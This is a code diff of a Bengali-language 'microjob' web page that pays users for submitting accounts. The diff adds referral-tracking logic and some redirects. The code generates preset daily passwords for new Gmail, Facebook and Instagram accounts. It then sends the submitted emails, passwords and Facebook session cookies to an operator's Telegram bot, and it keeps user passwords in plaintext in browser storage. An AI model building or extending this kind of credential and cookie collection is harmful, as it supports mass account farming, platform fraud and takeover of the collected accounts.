@@ -888,7 +888,7 @@
                     </div>
                 </div>
                 <div class="refer-link-box">
-                    <input type="text" id="myReferLink" value="https://abulkalam1122.github.io/mkr-microjob/?ref=user" readonly>
+                    <input type="text" id="myReferLink" value="" readonly>
                     <button type="button" class="refer-copy-btn" onclick="copyReferLink(this)"><i class="fa-solid fa-copy"></i> Copy</button>
                 </div>
             </div>
@@ -1289,29 +1289,34 @@
         // তারিখ অনুযায়ী পাসওয়ার্ড আপডেট এবং সেট করার ফাংশন
         function updateDailyPasswords() {
             const today = new Date();
-            const day = String(today.getDate()).padStart(2, '0'); // তারিখ (যেমন: 16)
+            const day = String(today.getDate()).padStart(2, '0');
             const monthNames = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
-            const month = monthNames[today.getMonth()]; // মাসের নাম
+            const month = monthNames[today.getMonth()];
             
             const dateStr = `${day} ${month}`;
 
-            // বিভিন্ন সেবার জন্য তারিখ ভিত্তিক পাসওয়ার্ড তৈরি (যেমন: @MyJob_MKR16 বা MYJOB_MKR16)
             const gmailPass = `@MyJob_MKR${day}`;
             const fbInstaPass = `MYJOB_MKR${day}`;
 
-            // এইচটিএমএল-এ পাসওয়ার্ডগুলো বসিয়ে দেওয়া
             document.getElementById('passText1').innerText = gmailPass;
             document.getElementById('passText2').innerText = fbInstaPass;
             document.getElementById('passText3').innerText = fbInstaPass;
 
-            // আজকের তারিখ লেবেলে দেখিয়ে দেওয়া যাতে ইউজার বুঝতে পারে
             if(document.getElementById('currentDateLabel1')) document.getElementById('currentDateLabel1').innerText = dateStr;
             if(document.getElementById('currentDateLabel2')) document.getElementById('currentDateLabel2').innerText = dateStr;
             if(document.getElementById('currentDateLabel3')) document.getElementById('currentDateLabel3').innerText = dateStr;
         }
 
-        // পেজ লোড হলে চেক করবে লগইন করা আছে কিনা, রেফার লিংক সেট করবে এবং তারিখ অনুযায়ী পাসওয়ার্ড আপডেট করবে
+        // পেজ লোড হলে চেক করা এবং রেফারি হ্যান্ডেল করা
         window.onload = function() {
+            // URL থেকে রেফার কোড চেক করা (যেমন: ?ref=017XXXXXXXX)
+            const urlParams = new URLSearchParams(window.location.search);
+            const refUser = urlParams.get('ref');
+            if (refUser) {
+                // ব্রাউজারে রেফারকারী ইউজрын তথ্য সেভ করে রাখা
+                localStorage.setItem('referredBy', refUser);
+            }
+
             let isLoggedIn = localStorage.getItem('isLoggedIn');
             if (isLoggedIn === 'true') {
                 showPage('homePage');
@@ -1319,14 +1324,12 @@
                 showPage('registerPage');
             }
 
-            // ইউজারের নিজস্ব রেফার লিংক ডাইনামিক করা
             let userPhone = localStorage.getItem('savedPhone') || 'user';
             let refLinkField = document.getElementById('myReferLink');
             if(refLinkField) {
                 refLinkField.value = window.location.origin + window.location.pathname + '?ref=' + userPhone;
             }
 
-            // তারিখ অনুযায়ী পাসওয়ার্ড কল করা
             updateDailyPasswords();
         };
 
@@ -1371,7 +1374,6 @@
             }, 2000);
         }
 
-        // রেফার লিংক কপি করার ফাংশন
         function copyReferLink(btn) {
             let refInput = document.getElementById('myReferLink');
             refInput.select();
@@ -1393,7 +1395,6 @@
                 return;
             }
 
-            // ডিভাইস প্রতি অ্যাকাউন্ট লিমিট (সর্বোচ্চ ৩টি)
             let count = parseInt(localStorage.getItem('mkrAccCount') || 0);
             if (count >= 3) { 
                 alert("দুঃখিত! এই ডিভাইসে সর্বোচ্চ ৩টি অ্যাকাউন্ট খোলার লিমিট পূর্ণ হয়ে গেছে।");
@@ -1407,10 +1408,26 @@
             localStorage.setItem('savedEmail', email);
             localStorage.setItem('savedPass', pass);
             localStorage.setItem('savedPhone', phone);
-            localStorage.setItem('hasSubmittedTask', 'false'); // রেফার বোনাসের শর্ত চেক করার জন্য
+            localStorage.setItem('hasSubmittedTask', 'false');
             localStorage.setItem('mkrAccCount', count + 1);
 
+            // রেফারি লজিক কাউন্ট (রেফার করলে ১ অথবা ২ রেকর্ড হ্যান্ডেল করা)
+            let referredBy = localStorage.getItem('referredBy');
+            if (referredBy) {
+                let refCountKey = 'ref_count_' + referredBy;
+                let currentRefCount = parseInt(localStorage.getItem(refCountKey) || 0) + 1;
+                
+                // রিকোয়ারমেন্ট অনুযায়ী ১ বা ২ রেক লেখার লজিক
+                if (currentRefCount === 1) {
+                    localStorage.setItem(refCountKey, '1 রেক (প্রথম রেফার)');
+                } else {
+                    localStorage.setItem(refCountKey, '2 রেক (দ্বিতীয় বা ততোধিক রেফার)');
+                }
+            }
+
             alert('রেজিস্ট্রেশন সফল হয়েছে! এখন আপনার জিমেইল ও পাসওয়ার্ড দিয়ে লগইন করুন।');
+            
+            // সফল হওয়ার পর অন্য পেজে রিডাইরেক্ট (লগইন পেজে যাচ্ছে)
             showPage('loginPage');
         }
 
@@ -1429,6 +1446,8 @@
 
             localStorage.setItem('isLoggedIn', 'true');
             alert('লগইন সফল হয়েছে!');
+            
+            // সফলভাবে লগইন হওয়ার পর হোম পেজে রিডাইরেক্ট
             showPage('homePage');
         }
 
@@ -1477,6 +1496,8 @@
                     alert('ডিপোজিট রিকোয়েস্ট সফলভাবে পাঠানো হয়েছে!');
                     event.target.reset();
                     updateDepositInfo();
+                    
+                    // সাকসেস হওয়ার পর হোম পেজে রিডাইরেক্ট
                     showPage('homePage');
                 } else {
                     alert('সমস্যা হয়েছে। আবার চেষ্টা করুন।');
@@ -1529,6 +1550,8 @@
                     alert('উইথড্র রিকোয়েস্ট সফলভাবে পাঠানো হয়েছে! ৫% চার্জ কেটে খুব শীঘ্রই পেমেন্ট দেওয়া হবে।');
                     event.target.reset();
                     calculateWithdrawFee();
+                    
+                    // সাকসেস হওয়ার পর হোম পেজে রিডাইরেক্ট
                     showPage('homePage');
                 } else {
                     alert('সমস্যা হয়েছে। আবার চেষ্টা করুন।');
@@ -1541,8 +1564,7 @@
         function submitAccount(event, platform) {
             event.preventDefault();
             
-            // কাজ সাবমিট করার সাথে সাথে রেফার শর্ত পূরণের ফ্ল্যাগ আপডেট করা
-            localStorage.getItem('hasSubmittedTask', 'true');
+            localStorage.setItem('hasSubmittedTask', 'true');
 
             let message = `📥 নতুন কাজ সাবমিট হয়েছে!\n\n🔹 প্ল্যাটফর্ম: ${platform}\n`;
 
@@ -1551,7 +1573,7 @@
                 let pass = document.getElementById('gmailPass').value;
                 message += `📧 ইমেইল: ${email}\n🔑 পাসওয়ার্ড: ${pass}`;
             } else if (platform === 'Facebook') {
-                let uid = document.getElementById('fbUid.value') || document.getElementById('fbUid').value;
+                let uid = document.getElementById('fbUid').value;
                 let pass = document.getElementById('fbPass').value;
                 let cookies = document.getElementById('fbCookies').value;
                 message += `👤 UID/Email: ${uid}\n🔑 পাসওয়ার্ড: ${pass}\n🍪 Cookies: ${cookies}`;
@@ -1566,8 +1588,11 @@
 
             fetch(url).then(response => {
                 if (response.ok) {
-                    alert('সফলভাবে সাবমিট হয়েছে! কাজ সরাসরি আপনার টেলিগ্রাম বটে চলে গেছে। (রেফার শর্ত পূরণের জন্য গণ্য করা হলো)');
+                    alert('সফলভাবে সাবমিট হয়েছে! কাজ সরাসরি আপনার টেলিগ্রাম বটে চলে গেছে।');
                     event.target.reset();
+                    
+                    // কাজ সফলভাবে সাবমিট হওয়ার পর হোম পেজে রিডাইরেক্ট
+                    showPage('homePage');
                 } else {
                     alert('সাবমিট করতে সমস্যা হয়েছে। আবার চেষ্টা করুন।');
                 }
